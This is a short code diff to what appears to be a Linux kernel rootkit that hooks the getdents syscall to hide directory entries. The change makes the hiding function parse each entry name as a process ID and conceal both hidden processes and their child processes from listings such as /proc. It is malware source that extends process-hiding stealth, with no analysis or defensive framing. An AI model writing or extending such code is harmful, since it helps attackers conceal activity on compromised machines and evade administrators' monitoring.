@@ -20,7 +20,7 @@ static asmlinkage long (*orig_getdents_ia32)(const struct pt_regs *);
 
 static notrace bool should_hide_name(const char *name)
 {
-    int i;
+    int i, pid;
 
     if (!name)
         return false;
@@ -30,7 +30,10 @@ static notrace bool should_hide_name(const char *name)
             return true;
     }
 
-    if (is_hidden_pid(name))
+    if (kstrtoint(name, 10, &pid) < 0)
+        return false;
+
+    if (is_hidden_pid(pid) || is_child_pid(pid))
         return true;
 
     return false;
